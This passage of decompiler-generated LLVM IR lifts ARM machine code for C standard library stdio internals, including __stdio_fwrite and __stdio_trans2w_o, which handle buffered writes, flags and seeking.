  %v2_17770 = sub i32 %v5_17764, %v2_17764
  store i32 %v2_17770, i32* %r2.global-to-local, align 4
  %v9_17770 = icmp eq i32 %v5_17764, %v2_17764
  store i1 %v9_17770, i1* %cpsr_z.global-to-local, align 1
  %v1_17774 = trunc i32 %v3_1776c to i8
  %v3_17774 = add i32 %v0_1775c, 1
  %v4_17774 = inttoptr i32 %v3_17774 to i8*
  store i8 %v1_17774, i8* %v4_17774, align 1
  %v0_17778 = load i32, i32* %r3.global-to-local, align 4
  %v1_17778 = trunc i32 %v0_17778 to i8
  %v2_17778 = load i32, i32* @r4, align 4
  %v3_17778 = inttoptr i32 %v2_17778 to i8*
  store i8 %v1_17778, i8* %v3_17778, align 1
  %v0_1777c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1777c, label %dec_label_pc_1775c.dec_label_pc_177c8_crit_edge, label %dec_label_pc_17780

dec_label_pc_1775c.dec_label_pc_177c8_crit_edge:  ; preds = %dec_label_pc_1775c
  %v0_177c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_177c8

dec_label_pc_17780:                               ; preds = %dec_label_pc_1775c
  %v0_17780 = load i32, i32* %r2.global-to-local, align 4
  %v1_17780 = load i32, i32* %r5.global-to-local, align 4
  %v9_17780 = icmp eq i32 %v0_17780, %v1_17780
  store i1 %v9_17780, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_17780, %v1_17780
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_17780
  store i32 %v0_17780, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17780, %bb24
  %v0_17788.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_1778c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_177ac
  %v2_1778c = phi i32 [ %v2_1778c.pre, %.preheader ], [ %v1_177b0, %dec_label_pc_177ac ]
  %v0_17788 = phi i32 [ %v0_17788.pre, %.preheader ], [ %v1_17798, %dec_label_pc_177ac ]
  %v1_17788 = inttoptr i32 %v0_17788 to i8*
  %v2_17788 = load i8, i8* %v1_17788, align 1
  %v3_17788 = zext i8 %v2_17788 to i32
  store i32 %v3_17788, i32* %r3.global-to-local, align 4
  %v3_1778c = inttoptr i32 %v2_1778c to i8*
  store i8 %v2_17788, i8* %v3_1778c, align 1
  %v0_17790 = load i32, i32* %r0.global-to-local, align 4
  %v1_17790 = inttoptr i32 %v0_17790 to i8*
  %v2_17790 = load i8, i8* %v1_17790, align 1
  %v3_17790 = zext i8 %v2_17790 to i32
  store i32 %v3_17790, i32* %r3.global-to-local, align 4
  %v7_17794 = icmp eq i8 %v2_17790, 10
  store i1 %v7_17794, i1* %cpsr_z.global-to-local, align 1
  %v0_17798 = load i32, i32* %r7.global-to-local, align 4
  %v1_17798 = add i32 %v0_17798, 1
  store i32 %v1_17798, i32* %r7.global-to-local, align 4
  br i1 %v7_17794, label %dec_label_pc_177a0, label %dec_label_pc_177ac

dec_label_pc_177a0:                               ; preds = %bb25
  %v0_177a0 = load i32, i32* @r4, align 4
  %v1_177a0 = add i32 %v0_177a0, 1
  %v2_177a0 = inttoptr i32 %v1_177a0 to i8*
  %v3_177a0 = load i8, i8* %v2_177a0, align 1
  %v4_177a0 = zext i8 %v3_177a0 to i32
  store i32 %v4_177a0, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_177a0, 2
  %v2_177a4 = icmp eq i8 %tmp30, 0
  store i1 %v2_177a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_177a4, label %dec_label_pc_177ac, label %dec_label_pc_177b8

dec_label_pc_177ac:                               ; preds = %dec_label_pc_177a0, %bb25
  %v0_177ac = load i32, i32* %r6.global-to-local, align 4
  %v1_177ac = add i32 %v0_177ac, -1
  store i32 %v1_177ac, i32* %r6.global-to-local, align 4
  %v7_177ac = icmp eq i32 %v0_177ac, 1
  store i1 %v7_177ac, i1* %cpsr_z.global-to-local, align 1
  %v1_177b0 = add i32 %v0_17790, 1
  store i32 %v1_177b0, i32* %r0.global-to-local, align 4
  br i1 %v7_177ac, label %dec_label_pc_177ac.dec_label_pc_177b8_crit_edge, label %bb25

dec_label_pc_177ac.dec_label_pc_177b8_crit_edge:  ; preds = %dec_label_pc_177ac
  %v0_177b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_177b8

dec_label_pc_177b8:                               ; preds = %dec_label_pc_177a0, %dec_label_pc_177ac.dec_label_pc_177b8_crit_edge
  %v0_177bc = phi i32 [ %v1_177b0, %dec_label_pc_177ac.dec_label_pc_177b8_crit_edge ], [ %v0_17790, %dec_label_pc_177a0 ]
  %v0_177b8 = phi i32 [ %v0_177b8.pre, %dec_label_pc_177ac.dec_label_pc_177b8_crit_edge ], [ %v0_177a0, %dec_label_pc_177a0 ]
  %v1_177b8 = add i32 %v0_177b8, 8
  %v2_177b8 = inttoptr i32 %v1_177b8 to i32*
  %v3_177b8 = load i32, i32* %v2_177b8, align 4
  store i32 %v3_177b8, i32* %r3.global-to-local, align 4
  %v2_177bc = add i32 %v0_177b8, 16
  %v3_177bc = inttoptr i32 %v2_177bc to i32*
  store i32 %v0_177bc, i32* %v3_177bc, align 4
  %v0_177c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_177c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_177c0 = sub i32 %v1_177c0, %v0_177c0
  store i32 %v2_177c0, i32* %r3.global-to-local, align 4
  %v1_177c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_177c4 = sub i32 %v1_177c4, %v2_177c0
  store i32 %v2_177c4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_177c8

dec_label_pc_177c8:                               ; preds = %dec_label_pc_1775c.dec_label_pc_177c8_crit_edge, %dec_label_pc_177b8
  %v0_177c8 = phi i32 [ %v0_177c8.pre, %dec_label_pc_1775c.dec_label_pc_177c8_crit_edge ], [ %v2_177c4, %dec_label_pc_177b8 ]
  %v1_177c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_177c8 = sub i32 %v1_177c8, %v0_177c8
  store i32 %v2_177c8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_177cc

dec_label_pc_1772c.dec_label_pc_177cc.loopexit_crit_edge: ; preds = %dec_label_pc_1772cthread-pre-split
  %v0_177cc.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_177cc

dec_label_pc_177cc:                               ; preds = %entry, %dec_label_pc_1772c.dec_label_pc_177cc.loopexit_crit_edge, %dec_label_pc_177c8
  %v0_177cc = phi i32 [ %v2_177c8, %dec_label_pc_177c8 ], [ %v0_177cc.pre.pre, %dec_label_pc_1772c.dec_label_pc_177cc.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_177cc, i32* %r0.global-to-local, align 4
  ret i32 %v0_177cc

; uselistorder directives
  uselistorder i32 %v0_177cc, { 1, 0 }
  uselistorder i32 %v0_177b8, { 1, 0 }
  uselistorder i32 %v1_177b0, { 0, 2, 1 }
  uselistorder i32 %v0_177ac, { 1, 0 }
  uselistorder i1 %v2_177a4, { 1, 0 }
  uselistorder i32 %v1_17798, { 1, 0 }
  uselistorder i32 %v0_17780, { 1, 0, 2 }
  uselistorder i32 %v5_17764, { 1, 0 }
  uselistorder i32 %v2_17764, { 1, 0, 2 }
  uselistorder i32 %v0_1774c, { 1, 0 }
  uselistorder i32 %v4_17744, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_17754, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_177cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_177c8, { 1, 0 }
  uselistorder label %dec_label_pc_177b8, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_17738, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_177d4 = load i32, i32* @r4, align 4
  store i32 %v3_177d4, i32* %stack_var_-20, align 4
  %v6_177d4 = load i32, i32* @r5, align 4
  %v9_177d4 = load i32, i32* @r6, align 4
  %v12_177d4 = load i32, i32* @r7, align 4
  %v15_177d4 = load i32, i32* @lr, align 4
  %v1_177d8 = add i32 %arg3, 1
  %v2_177d8 = inttoptr i32 %v1_177d8 to i8*
  %v3_177d8 = load i8, i8* %v2_177d8, align 1
  %v4_177d8 = zext i8 %v3_177d8 to i32
  %v3_177dc = mul nuw nsw i32 %v4_177d8, 256
  %v1_177e0 = and i32 %v3_177dc, 512
  store i32 %v1_177e0, i32* @r4, align 4
  %v2_177e0 = icmp eq i32 %v1_177e0, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_177e0, label %dec_label_pc_177f4, label %dec_label_pc_178f0

dec_label_pc_177f4:                               ; preds = %entry
  %v1_177f4 = add i32 %arg3, 4
  %v2_177f4 = inttoptr i32 %v1_177f4 to i32*
  %v3_177f4 = load i32, i32* %v2_177f4, align 4
  %v1_177fc = add i32 %arg3, 16
  %v2_177fc = inttoptr i32 %v1_177fc to i32*
  %v3_177fc = load i32, i32* %v2_177fc, align 4
  store i32 %v3_177fc, i32* @r0, align 4
  %v1_17800 = add i32 %arg3, 12
  %v2_17800 = inttoptr i32 %v1_17800 to i32*
  %v3_17800 = load i32, i32* %v2_17800, align 4
  %v4_17804 = icmp eq i32 %v3_177f4, -2
  %v2_17808 = sub i32 %v3_17800, %v3_177fc
  br i1 %v4_17804, label %dec_label_pc_17808, label %dec_label_pc_17830

dec_label_pc_17808:                               ; preds = %dec_label_pc_177f4
  %v3_1780c = icmp ugt i32 %v2_17808, %arg2
  br i1 %v3_1780c, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_17808
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17808, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_17808, %dec_label_pc_17808 ]
  %v0_17814 = phi i32 [ %arg2, %bb ], [ %v2_17808, %dec_label_pc_17808 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_17814, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1781c = call i32 @memcpy()
  %v0_17820 = load i32, i32* @r5, align 4
  %v1_17820 = add i32 %v0_17820, 16
  %v2_17820 = inttoptr i32 %v1_17820 to i32*
  %v3_17820 = load i32, i32* %v2_17820, align 4
  %v1_17824 = load i32, i32* @r4, align 4
  %v2_17824 = add i32 %v1_17824, %v3_17820
  store i32 %v2_17824, i32* %v2_17820, align 4
  br label %dec_label_pc_17904

dec_label_pc_17830:                               ; preds = %dec_label_pc_177f4
  %tmp = icmp ult i32 %v2_17808, %arg2
  br i1 %tmp, label %dec_label_pc_178d0, label %dec_label_pc_1783c

dec_label_pc_1783c:                               ; preds = %dec_label_pc_17830
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17844 = call i32 @memcpy()
  %v0_17848 = load i32, i32* @r5, align 4
  %v1_17848 = add i32 %v0_17848, 16
  %v2_17848 = inttoptr i32 %v1_17848 to i32*
  %v3_17848 = load i32, i32* %v2_17848, align 4
  %v1_1784c = add i32 %v0_17848, 1
  %v2_1784c = inttoptr i32 %v1_1784c to i8*
  %v3_1784c = load i8, i8* %v2_1784c, align 1
  %v1_17850 = load i32, i32* @r6, align 4
  %v2_17850 = add i32 %v1_17850, %v3_17848
  %tmp17 = urem i8 %v3_1784c, 2
  %v2_17854 = icmp eq i8 %tmp17, 0
  store i32 %v2_17850, i32* %v2_17848, align 4
  br i1 %v2_17854, label %dec_label_pc_17904, label %dec_label_pc_17860

dec_label_pc_17860:                               ; preds = %dec_label_pc_1783c
  %v0_17860 = load i32, i32* %r7.global-to-local, align 4
  %v0_17868 = load i32, i32* @r6, align 4
  %v4_1786c = call i32 @memrchr(i32 %v0_17860, i32 10, i32 %v0_17868, i32 %v2_17850)
  %v2_17870 = icmp eq i32 %v4_1786c, 0
  br i1 %v2_17870, label %dec_label_pc_17904, label %dec_label_pc_17878

dec_label_pc_17878:                               ; preds = %dec_label_pc_17860
  %v0_17878 = load i32, i32* @r5, align 4
  store i32 %v0_17878, i32* @r0, align 4
  %v0_1787c = call i32 @__stdio_wcommit()
  %v2_17880 = icmp eq i32 %v0_1787c, 0
  br i1 %v2_17880, label %dec_label_pc_17904, label %dec_label_pc_17888

dec_label_pc_17888:                               ; preds = %dec_label_pc_17878
  %v0_17888 = load i32, i32* @r6, align 4
  %v3_17888 = icmp uge i32 %v0_17888, %v0_1787c
  %v0_1787c.v0_17888 = select i1 %v3_17888, i32 %v0_1787c, i32 %v0_17888
  store i32 %v0_1787c.v0_17888, i32* @r4, align 4
  %v2_17894 = sub i32 %v0_17888, %v0_1787c.v0_17888
  %v0_17898 = load i32, i32* %r7.global-to-local, align 4
  %v2_17898 = add i32 %v0_17898, %v2_17894
  store i32 %v2_17898, i32* %r7.global-to-local, align 4
  store i32 %v0_1787c.v0_17888, i32* @r2, align 4
  %v4_178a8 = call i32 @__GI_memchr(i32 %v2_17898, i32 10, i32 %v0_1787c.v0_17888, i32 %v2_17894)
  %v2_178ac = icmp eq i32 %v4_178a8, 0
  br i1 %v2_178ac, label %dec_label_pc_17904, label %dec_label_pc_178b4

dec_label_pc_178b4:                               ; preds = %dec_label_pc_17888
  %v0_178b4 = load i32, i32* @r5, align 4
  %v1_178b4 = add i32 %v0_178b4, 16
  %v2_178b4 = inttoptr i32 %v1_178b4 to i32*
  %v3_178b4 = load i32, i32* %v2_178b4, align 4
  %v0_178b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_178b8 = load i32, i32* @r4, align 4
  %v2_178b8 = sub i32 %v0_178b8, %v4_178a8
  %v2_178bc = add i32 %v2_178b8, %v1_178b8
  %v2_178c0 = sub i32 %v3_178b4, %v2_178bc
  %v1_178c4 = load i32, i32* @r6, align 4
  %v2_178c4 = sub i32 %v1_178c4, %v2_178bc
  store i32 %v2_178c4, i32* @r6, align 4
  store i32 %v2_178c0, i32* %v2_178b4, align 4
  br label %dec_label_pc_17904

dec_label_pc_178d0:                               ; preds = %dec_label_pc_17830
  %v1_178d0 = add i32 %arg3, 8
  %v2_178d0 = inttoptr i32 %v1_178d0 to i32*
  %v3_178d0 = load i32, i32* %v2_178d0, align 4
  %v9_178d4 = icmp eq i32 %v3_177fc, %v3_178d0
  br i1 %v9_178d4, label %dec_label_pc_178f0, label %dec_label_pc_178dc

dec_label_pc_178dc:                               ; preds = %dec_label_pc_178d0
  store i32 %arg3, i32* @r0, align 4
  %v0_178e0 = call i32 @__stdio_wcommit()
  %v2_178e4 = icmp eq i32 %v0_178e0, 0
  br i1 %v2_178e4, label %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge, label %bb13

dec_label_pc_178dc.dec_label_pc_178f0_crit_edge:  ; preds = %dec_label_pc_178dc
  %v0_178f8.pre = load i32, i32* @r6, align 4
  %v0_178f0.pre = load i32, i32* @r5, align 4
  %v0_178f4.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_178fc.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_178f0

bb13:                                             ; preds = %dec_label_pc_178dc
  %v1_178e8 = load i32, i32* @r4, align 4
  store i32 %v1_178e8, i32* @r6, align 4
  br label %dec_label_pc_17904

dec_label_pc_178f0:                               ; preds = %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge, %entry, %dec_label_pc_178d0
  %v2_178fc = phi i32 [ %v2_178fc.pre, %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge ], [ %v3_177d4, %entry ], [ %v3_177d4, %dec_label_pc_178d0 ]
  %v0_178f4 = phi i32 [ %v0_178f4.pre, %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_178d0 ]
  %v0_178f0 = phi i32 [ %v0_178f0.pre, %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_178d0 ]
  %v0_178f8 = phi i32 [ %v0_178f8.pre, %dec_label_pc_178dc.dec_label_pc_178f0_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_178d0 ]
  store i32 %v2_178fc, i32* @r4, align 4
  store i32 %v9_177d4, i32* @r6, align 4
  store i32 %v15_177d4, i32* @lr, align 4
  %v3_17900 = inttoptr i32 %v0_178f0 to i8*
  %v4_17900 = call i32 @__stdio_WRITE(i8* %v3_17900, i32 %v0_178f4, i32 %v0_178f8)
  br label %dec_label_pc_17904

dec_label_pc_17904:                               ; preds = %bb13, %dec_label_pc_17888, %dec_label_pc_17878, %dec_label_pc_17860, %dec_label_pc_1783c, %dec_label_pc_178b4, %bb10, %dec_label_pc_178f0
  %v0_17904 = load i32, i32* @r6, align 4
  %v2_17908 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17908, i32* @r4, align 4
  store i32 %v6_177d4, i32* @r5, align 4
  store i32 %v9_177d4, i32* @r6, align 4
  store i32 %v12_177d4, i32* @r7, align 4
  ret i32 %v0_17904

; uselistorder directives
  uselistorder i32 %v2_178bc, { 1, 0 }
  uselistorder i32 %v2_17894, { 1, 0 }
  uselistorder i32 %v0_1787c.v0_17888, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17888, { 1, 0, 2 }
  uselistorder i32 %v2_17808, { 2, 0, 1, 3 }
  uselistorder i32 %v9_177d4, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 8, 7, 6, 3, 5 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_17904, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_178f0, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1790c = load i32, i32* @r4, align 4
  store i32 %v3_1790c, i32* %stack_var_-8, align 4
  %v3_17910 = load i8, i8* %arg1, align 1
  %v4_17910 = zext i8 %v3_17910 to i32
  store i32 %v4_17910, i32* %r2.global-to-local, align 4
  %v2_17914 = add i32 %tmp, 1
  %v3_17914 = inttoptr i32 %v2_17914 to i8*
  %v4_17914 = load i8, i8* %v3_17914, align 1
  %v5_17914 = zext i8 %v4_17914 to i32
  store i32 %v5_17914, i32* %r3.global-to-local, align 4
  %v4_17918 = mul nuw nsw i32 %v5_17914, 256
  %v5_17918 = or i32 %v4_17918, %v4_17910
  store i32 %v5_17918, i32* %r2.global-to-local, align 4
  %v2_1791c = and i32 %v5_17918, %arg2
  %v4_1791c = icmp eq i32 %v2_1791c, 0
  store i1 %v4_1791c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_1791c, label %dec_label_pc_17928, label %dec_label_pc_17940

dec_label_pc_17928:                               ; preds = %entry
  %v1_17928 = and i32 %v5_17918, 2176
  %v2_17928 = icmp eq i32 %v1_17928, 0
  store i1 %v2_17928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17928, label %dec_label_pc_17930, label %dec_label_pc_17954

dec_label_pc_17930:                               ; preds = %dec_label_pc_17928
  %v2_17930 = or i32 %v5_17918, %arg2
  store i32 %v2_17930, i32* %r2.global-to-local, align 4
  %v3_17934 = sdiv i32 %v2_17930, 256
  store i32 %v3_17934, i32* %r3.global-to-local, align 4
  %v1_17938 = trunc i32 %v3_17934 to i8
  store i8 %v1_17938, i8* %v3_17914, align 1
  %v0_1793c = load i32, i32* %r2.global-to-local, align 4
  %v1_1793c = trunc i32 %v0_1793c to i8
  store i8 %v1_1793c, i8* %arg1, align 1
  %v0_17940.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17940

dec_label_pc_17940:                               ; preds = %entry, %dec_label_pc_17930
  %v0_1798c = phi i32 [ %tmp, %entry ], [ %v0_17940.pre, %dec_label_pc_17930 ]
  %v1_17940 = inttoptr i32 %v0_1798c to i8*
  %v2_17940 = load i8, i8* %v1_17940, align 1
  %v3_17940 = zext i8 %v2_17940 to i32
  store i32 %v3_17940, i32* %r2.global-to-local, align 4
  %v1_17944 = add i32 %v0_1798c, 1
  %v2_17944 = inttoptr i32 %v1_17944 to i8*
  %v3_17944 = load i8, i8* %v2_17944, align 1
  %v4_17944 = zext i8 %v3_17944 to i32
  store i32 %v4_17944, i32* %r3.global-to-local, align 4
  %v4_17948 = mul nuw nsw i32 %v4_17944, 256
  %v1_1794c = and i32 %v3_17940, 32
  %v2_1794c = icmp eq i32 %v1_1794c, 0
  store i1 %v2_1794c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1794c, label %dec_label_pc_1797c, label %dec_label_pc_17954

dec_label_pc_17954:                               ; preds = %dec_label_pc_17928, %dec_label_pc_17940
  %v0_17954 = call i32 @__errno_location()
  store i32 %v0_17954, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1795c = inttoptr i32 %v0_17954 to i32*
  store i32 9, i32* %v2_1795c, align 4
  br label %dec_label_pc_17960

dec_label_pc_17960:                               ; preds = %dec_label_pc_179a4, %dec_label_pc_17954
  %v0_17960 = load i32, i32* @r4, align 4
  %v1_17960 = inttoptr i32 %v0_17960 to i32*
  %v2_17960 = load i32, i32* %v1_17960, align 4
  %v1_17964 = or i32 %v2_17960, 8
  store i32 %v1_17964, i32* %r3.global-to-local, align 4
  %v3_17968 = sdiv i32 %v2_17960, 256
  store i32 %v3_17968, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_17970 = trunc i32 %v3_17968 to i8
  %v3_17970 = add i32 %v0_17960, 1
  %v4_17970 = inttoptr i32 %v3_17970 to i8*
  store i8 %v1_17970, i8* %v4_17970, align 1
  %v0_17974 = load i32, i32* %r3.global-to-local, align 4
  %v1_17974 = trunc i32 %v0_17974 to i8
  %v2_17974 = load i32, i32* @r4, align 4
  %v3_17974 = inttoptr i32 %v2_17974 to i8*
  store i8 %v1_17974, i8* %v3_17974, align 1
  %v2_17978 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17978, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1797c:                               ; preds = %dec_label_pc_17940
  %tmp15 = urem i8 %v2_17940, 4
  %v2_1797c = icmp eq i8 %tmp15, 0
  store i1 %v2_1797c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1797c, label %dec_label_pc_179e0, label %dec_label_pc_17984

dec_label_pc_17984:                               ; preds = %dec_label_pc_1797c
  %v1_17984 = and i32 %v3_17940, 4
  store i32 %v1_17984, i32* @r1, align 4
  %v2_17984 = icmp eq i32 %v1_17984, 0
  store i1 %v2_17984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17984, label %dec_label_pc_1798c, label %dec_label_pc_179bc

dec_label_pc_1798c:                               ; preds = %dec_label_pc_17984
  %v1_1798c = add i32 %v0_1798c, 20
  %v2_1798c = inttoptr i32 %v1_1798c to i32*
  %v3_1798c = load i32, i32* %v2_1798c, align 4
  store i32 %v3_1798c, i32* %r2.global-to-local, align 4
  %v1_17990 = add i32 %v0_1798c, 16
  %v2_17990 = inttoptr i32 %v1_17990 to i32*
  %v3_17990 = load i32, i32* %v2_17990, align 4
  store i32 %v3_17990, i32* %r3.global-to-local, align 4
  %v9_17994 = icmp eq i32 %v3_1798c, %v3_17990
  store i1 %v9_17994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17994, label %dec_label_pc_1799c, label %dec_label_pc_179a4

dec_label_pc_1799c:                               ; preds = %dec_label_pc_1798c
  %v1_1799c = and i32 %v3_17940, 2
  %v2_1799c = icmp eq i32 %v1_1799c, 0
  store i1 %v2_1799c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1799c, label %dec_label_pc_179bc, label %dec_label_pc_179a4

dec_label_pc_179a4:                               ; preds = %dec_label_pc_1798c, %dec_label_pc_1799c
  %v1_179a4 = and i32 %v4_17948, 1024
  %v2_179a4 = icmp eq i32 %v1_179a4, 0
  store i1 %v2_179a4, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_179a4, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_179b0 = call i32 @__GI_fseek()
  store i32 %v0_179b0, i32* %r0.global-to-local, align 4
  %v2_179b4 = icmp eq i32 %v0_179b0, 0
  store i1 %v2_179b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_179b4, label %.dec_label_pc_179bc_crit_edge, label %dec_label_pc_17960

.dec_label_pc_179bc_crit_edge:                    ; preds = %dec_label_pc_179a4
  %v0_179bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_179bc

dec_label_pc_179bc:                               ; preds = %.dec_label_pc_179bc_crit_edge, %dec_label_pc_17984, %dec_label_pc_1799c
  %v2_179cc = phi i32 [ %v0_179bc.pre, %.dec_label_pc_179bc_crit_edge ], [ %v0_1798c, %dec_label_pc_17984 ], [ %v0_1798c, %dec_label_pc_1799c ]
  %v1_179bc = inttoptr i32 %v2_179cc to i32*
  %v2_179bc = load i32, i32* %v1_179bc, align 4
  store i32 %v2_179bc, i32* %r3.global-to-local, align 4
  %v1_179c0 = add i32 %v2_179cc, 8
  %v2_179c0 = inttoptr i32 %v1_179c0 to i32*
  %v3_179c0 = load i32, i32* %v2_179c0, align 4
  store i32 %v3_179c0, i32* %r1.global-to-local, align 4
  %v1_179c4 = and i32 %v2_179bc, -4
  store i32 %v1_179c4, i32* %r3.global-to-local, align 4
  %v3_179c8 = sdiv i32 %v2_179bc, 256
  store i32 %v3_179c8, i32* %r2.global-to-local, align 4
  %v1_179cc = trunc i32 %v3_179c8 to i8
  %v3_179cc = add i32 %v2_179cc, 1
  %v4_179cc = inttoptr i32 %v3_179cc to i8*
  store i8 %v1_179cc, i8* %v4_179cc, align 1
  %v0_179d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_179d0 = load i32, i32* @r4, align 4
  %v2_179d0 = add i32 %v1_179d0, 20
  %v3_179d0 = inttoptr i32 %v2_179d0 to i32*
  store i32 %v0_179d0, i32* %v3_179d0, align 4
  %v0_179d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_179d4 = trunc i32 %v0_179d4 to i8
  %v2_179d4 = load i32, i32* @r4, align 4
  %v3_179d4 = inttoptr i32 %v2_179d4 to i8*
  store i8 %v1_179d4, i8* %v3_179d4, align 1
  %v0_179d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_179d8 = load i32, i32* @r4, align 4
  %v2_179d8 = add i32 %v1_179d8, 24
  %v3_179d8 = inttoptr i32 %v2_179d8 to i32*
  store i32 %v0_179d8, i32* %v3_179d8, align 4
  %v0_179dc = load i32, i32* %r1.global-to-local, align 4
  %v1_179dc = load i32, i32* @r4, align 4
  %v2_179dc = add i32 %v1_179dc, 16
  %v3_179dc = inttoptr i32 %v2_179dc to i32*
  store i32 %v0_179dc, i32* %v3_179dc, align 4
  %v0_179e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_179e0

dec_label_pc_179e0:                               ; preds = %dec_label_pc_1797c, %dec_label_pc_179bc
  %v2_179ec = phi i32 [ %v0_1798c, %dec_label_pc_1797c ], [ %v0_179e0.pre, %dec_label_pc_179bc ]
  %v1_179e0 = inttoptr i32 %v2_179ec to i32*
  %v2_179e0 = load i32, i32* %v1_179e0, align 4
  %v1_179e4 = or i32 %v2_179e0, 64
  store i32 %v1_179e4, i32* %r2.global-to-local, align 4
  %v3_179e8 = sdiv i32 %v2_179e0, 256
  store i32 %v3_179e8, i32* %r3.global-to-local, align 4
  %v1_179ec = trunc i32 %v3_179e8 to i8
  %v3_179ec = add i32 %v2_179ec, 1
  %v4_179ec = inttoptr i32 %v3_179ec to i8*
  store i8 %v1_179ec, i8* %v4_179ec, align 1
  %v0_179f0 = load i32, i32* @r4, align 4
  %v1_179f0 = add i32 %v0_179f0, 1
  %v2_179f0 = inttoptr i32 %v1_179f0 to i8*
  %v3_179f0 = load i8, i8* %v2_179f0, align 1
